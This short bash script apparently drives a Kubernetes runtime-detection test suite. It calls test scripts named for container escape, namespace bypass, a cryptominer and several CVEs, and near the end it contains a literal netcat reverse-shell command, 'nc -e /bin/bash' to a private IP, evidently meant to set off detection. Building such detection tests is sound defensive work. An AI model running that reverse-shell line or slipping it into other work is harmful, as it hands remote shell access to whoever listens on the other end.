#!/usr/bin/env bash

sleep 15

# ATT&CK
./test/attck/script.sh

# DRIFT PREVENTION
./test/drift-prevention/script.sh

# TODO: K8S GOAT (CRYPTOMINER) - ADD AND RUN CRYPTOMINER
./test/crypto_miner/script.sh

# TODO: K8S GOAT (DIND) - DOWNLOAD DOCKER BINARY AND TRY RUNNING IT
./test/docker-in-docker/script.sh

# TODO: K8S GOAT (DOCKER CIS) - DOWNLOAD docker-bench-security.sh AND TRY RUNNING IT

# K8S GOAT (CONTAINER ESCAPE)
./test/CHROOT-CONTAINER-ESCAPE/script.sh

#K8S GOAT (Kubernetes Namespaces bypass)
./test/K8s-Namespaces-bypass/script.sh

#K8S GOAT (Gaining environment information)
./test/Gaining-environment-information/script.sh

# RUNTIME DETECTION
python3 test/CVE-2019-3874/server.py
# /usr/lib/go-1.10/bin/go run test/CVE-2019-5736/main.go
./test/CVE-2019-5736/script.sh
python3 test/CVE-2020-14386/server.py
./test/RS-SOCKET_AND_DUP2/script.sh
./test/CVE-2019-14287/script.sh
nc -e /bin/bash 192.168.0.12 1234
./test/docker-in-docker/script.sh
./test/crypto_miner/script.sh
